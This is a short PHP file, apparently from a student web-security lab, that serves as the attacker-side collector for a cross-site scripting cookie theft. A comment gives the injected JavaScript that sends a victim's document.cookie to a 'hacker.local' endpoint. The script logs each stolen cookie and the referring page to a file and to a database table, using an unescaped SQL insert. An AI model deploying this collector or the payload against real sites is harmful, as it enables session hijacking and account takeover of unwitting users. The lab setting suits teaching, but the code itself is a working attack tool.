<?php
// Add link này nè
//window.open("http://hacker.local/nhom-J-web-security/hacker.php?cookie="+document.cookie)

if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để
    $f = fopen('cookie.txt', 'a');
    // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
    fwrite($f, $_SERVER['HTTP_REFERER']);
    // Ghi giá trị cookie
    fwrite($f, ". Cookie la: " . $cookie . " \n");
    // Đóng file lại
    fclose($f);
}

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "app_web1";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO hacker (cookie)
VALUES ('$cookie')";

if ($conn->query($sql) === TRUE) {
  echo "New record created successfully";
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();